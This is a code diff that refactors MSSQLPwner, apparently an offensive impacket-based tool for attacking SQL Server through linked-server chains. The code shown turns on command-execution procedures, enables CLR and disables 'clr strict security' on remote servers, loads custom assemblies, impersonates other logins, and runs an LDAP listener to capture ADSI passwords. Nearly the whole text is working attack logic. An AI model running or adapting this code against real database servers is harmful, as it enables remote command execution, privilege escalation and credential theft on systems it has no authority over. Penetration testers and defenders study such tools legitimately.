@@ -25,6 +25,12 @@ from impacket.examples.utils import parse_target
 class MSSQLPwner(BaseSQLClient):
     def __init__(self, server_address, args_options):
         super().__init__(server_address, args_options)
+        if args_options.debug is True:
+            logging.getLogger("impacket").setLevel(logging.DEBUG)
+            # Print the Library's installation path
+            logging.debug(version.getInstallationPath())
+        else:
+            logging.getLogger("impacket").setLevel(logging.INFO)
         self.server_address = server_address
         self.debug = args_options.debug
         self.state = {
@@ -34,7 +40,7 @@ class MSSQLPwner(BaseSQLClient):
         }
         self.rev2self = dict()
         self.hostname = None
-        self.max_recursive_links = options.max_recursive_links
+        self.max_recursive_links = args_options.max_recursive_links
 
     def retrieve_links(self, linked_server: str, old_state: list = None) -> None:
         """
@@ -93,7 +99,7 @@ class MSSQLPwner(BaseSQLClient):
         """
         method_func = utilities.build_exec_at if method == "exec_at" else utilities.build_openquery
         chained_query = query
-        flow = flow[1:] if flow[0] == self.hostname else flow # If the first server is the current server, remove it
+        flow = flow[1:] if flow[0] == self.hostname else flow  # If the first server is the current server, remove it
         for link in flow[::-1]:  # Iterates over the linked servers
             chained_query = method_func(link, chained_query)
         return chained_query
@@ -192,8 +198,7 @@ class MSSQLPwner(BaseSQLClient):
             self.get_accessible_users(linked_server)
         return True
 
-    def reconfigure_procedure(self, procedure: str, linked_server: str,
-                              permission_is_required: bool, required_status: bool) -> bool:
+    def reconfigure_procedure(self, procedure: str, linked_server: str, required_status: bool) -> bool:
         """
         This function is responsible to enable a procedure on the server.
         """
@@ -205,9 +210,20 @@ class MSSQLPwner(BaseSQLClient):
             LOG.error(f"Cant fetch is_{procedure}_enabled status")
             return False
 
-        result = is_procedure_enabled['results'][-1]
-        if result['procedure'] != str(required_status):
-            LOG.error(f"{procedure} need to be changed")
+        if is_procedure_enabled['results'][-1]['procedure'] != 'True':
+            LOG.error(f"{procedure} is not enabled")
+            return False
+
+        is_procedure_executable = self.build_chain(
+            Queries.IS_PROCEDURE_EXECUTABLE.format(procedure=procedure_custom_name),
+            linked_server)
+
+        if not is_procedure_executable['is_success']:
+            LOG.error(f"Cant fetch is_{procedure}_executable status")
+            return False
+
+        if is_procedure_executable['results'][-1]['HasPermission'] != str(required_status):
+            LOG.warning(f"{procedure} need to be changed")
             is_procedure_can_be_configured = self.build_chain(Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED, linked_server)
             if (not is_procedure_can_be_configured['is_success']) or \
                     is_procedure_can_be_configured['results'][0]['CanChangeConfiguration'] == 'False':
@@ -216,41 +232,25 @@ class MSSQLPwner(BaseSQLClient):
 
             LOG.info(f"{procedure} can be configured")
             query = ""
-            if result['procedure'] != str(required_status):
-                status = 1 if required_status else 0
-                rev_status = 0 if required_status else 1
-                query += Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure_custom_name, status=status)
-                LOG.info(f"Reconfiguring {procedure}")
-                self.add_rev2self_cmd(linked_server,
-                                      Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure, status=rev_status))
+            status = 1 if required_status else 0
+            rev_status = 0 if required_status else 1
+            query += Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure_custom_name, status=status)
+            LOG.info(f"Reconfiguring {procedure}")
+            self.add_rev2self_cmd(linked_server,
+                                  Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure, status=rev_status))
 
             if not self.build_chain(query, linked_server, method="exec_at")['is_success']:
                 LOG.warning(f"Failed to enable {procedure}")
-
-        if not permission_is_required:
-            return True
-
-        is_procedure_can_be_used = self.build_chain(Queries.IS_PROCEDURE_EXECUTABLE.format(procedure=procedure),
-                                                    linked_server)
-
-        if not is_procedure_can_be_used['is_success']:
-            LOG.error(f"Cant fetch is_{procedure}_can_be_used status")
-            return False
-
-        if is_procedure_can_be_used['results'][-1]['HasPermission'] == 0:
-            LOG.error(f"{procedure} is not enabled")
-            return False
         return True
 
     def execute_procedure(self, procedure: str, command: str, linked_server: str) -> bool:
         """
         This function is responsible to execute a procedure on a linked server.
         """
-        if not self.reconfigure_procedure("show advanced options", linked_server, permission_is_required=False,
-                                          required_status=True):
+        if not self.reconfigure_procedure("show advanced options", linked_server, required_status=True):
             return False
 
-        if not self.reconfigure_procedure(procedure, linked_server, permission_is_required=True, required_status=True):
+        if not self.reconfigure_procedure(procedure, linked_server, required_status=True):
             return False
 
         if procedure == 'sp_oacreate':
@@ -259,9 +259,13 @@ class MSSQLPwner(BaseSQLClient):
             procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure, command=command)
 
         results = self.build_chain(procedure_query, linked_server, method="exec_at")
+        if not results['is_success']:
+            LOG.warning(f"Failed to execute {procedure} on {linked_server}")
+            return False
 
-        LOG.info(f"The {procedure} command executed successfully")
+        LOG.info(f"The {procedure} command executed successfully on {linked_server}")
         if not results['results']:
+            LOG.warning("Failed to resolve the results")
             return results['is_success']
 
         for result in results['results']:
@@ -278,18 +282,15 @@ class MSSQLPwner(BaseSQLClient):
             return False
 
         custom_asm_hex = utilities.hexlify_file(asm_file_location)
-        if not self.reconfigure_procedure('show advanced options', linked_server, permission_is_required=False,
-                                          required_status=True):
+        if not self.reconfigure_procedure('show advanced options', linked_server, required_status=True):
             LOG.error("Failed to enable show advanced options")
             return False
 
-        if not self.reconfigure_procedure('clr enabled', linked_server, permission_is_required=False,
-                                          required_status=True):
+        if not self.reconfigure_procedure('clr enabled', linked_server, required_status=True):
             LOG.error("Failed to enable clr")
             return False
 
-        if not self.reconfigure_procedure('clr strict security', linked_server, permission_is_required=False,
-                                          required_status=False):
+        if not self.reconfigure_procedure('clr strict security', linked_server, required_status=False):
             LOG.error("Failed to disable clr strict security")
             return False
 
@@ -348,7 +349,9 @@ class MSSQLPwner(BaseSQLClient):
         This function is responsible to execute a custom assembly.
         In general this function is starts with creates the assembly, trust it, create the function and execute it.
         """
+
         if not self.add_new_custom_asm(asm_file_location, linked_server, "FuncAsm"):
+
             return False
 
         add_function = self.build_chain(Queries.CREATE_FUNCTION.format(
@@ -390,7 +393,6 @@ class MSSQLPwner(BaseSQLClient):
                                 method="exec_at")['is_success']:
                 LOG.info(f"Successfully impersonated as {user} on {linked_server}")
                 return True
-            break
 
         return False
 
@@ -415,7 +417,6 @@ class MSSQLPwner(BaseSQLClient):
                                 method="exec_at")['is_success']:
                 LOG.info(f"Successfully authenticated as {user} on {linked_server}")
                 return True
-            break
 
         return False
 
@@ -473,7 +474,7 @@ class MSSQLPwner(BaseSQLClient):
 
         return False
 
-    def procedure_chain_builder(self, func: Callable, args: list, linked_server: str):
+    def procedure_chain_builder(self, func: Callable, args: list, linked_server: str) -> bool:
         """
         This function is responsible to build a procedure chain.
         """
@@ -482,21 +483,19 @@ class MSSQLPwner(BaseSQLClient):
             retval = self.procedure_runner(func, args, linked_server)
             if retval:
                 LOG.info(f"Successfully executed {func.__name__} on {linked_server}")
-                return
+                return True
 
             LOG.error(f"{func.__name__} cannot be executed on {linked_server}")
             LOG.info("Trying to find a linkable server chain")
 
-        is_discovered = False
         for chain_str, _ in self.filter_relevant_chains(linked_server):
-            is_discovered = True
             LOG.info(f"Trying to execute {func.__name__} on {chain_str}")
             if self.procedure_runner(func, args, linked_server=chain_str):
                 LOG.info(f"Successfully executed {func.__name__} on {chain_str}")
-                break
+                return True
 
-        if not is_discovered:
-            LOG.error(f"Failed to find {linked_server}")
+        LOG.warning(f"Failed to execute {func.__name__} on {linked_server}")
+        return False
 
     def retrieve_adsi_chain_password(self, linked_server: str, adsi_provider: str):
         for _, chain in self.state['adsi_provider_servers'].items():
@@ -513,9 +512,10 @@ class MSSQLPwner(BaseSQLClient):
         adsi_provider = adsi_provider
         for chain in self.retrieve_adsi_chain_password(linked_server, adsi_provider):
             is_discovered = True
-
-            if self.execute_custom_assembly_function(ldap_file_location, "listen", "LdapSrv", "ldapAssembly", str(port),
-                                                     " -> ".join(chain[:-1])):
+            if self.procedure_chain_builder(self.execute_custom_assembly_function,
+                                            [ldap_file_location, "listen", "LdapSrv", "ldapAssembly",
+                                             str(port)],
+                                            linked_server=linked_server):
                 time.sleep(1)
                 client = MSSQLPwner(self.server_address, self.options)
                 client.options.debug = False
@@ -552,13 +552,6 @@ if __name__ == '__main__':
         sys.exit(1)
 
     options = parser.parse_args()
-
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
 
     if not options.target:
         LOG.error("target must be supplied!")
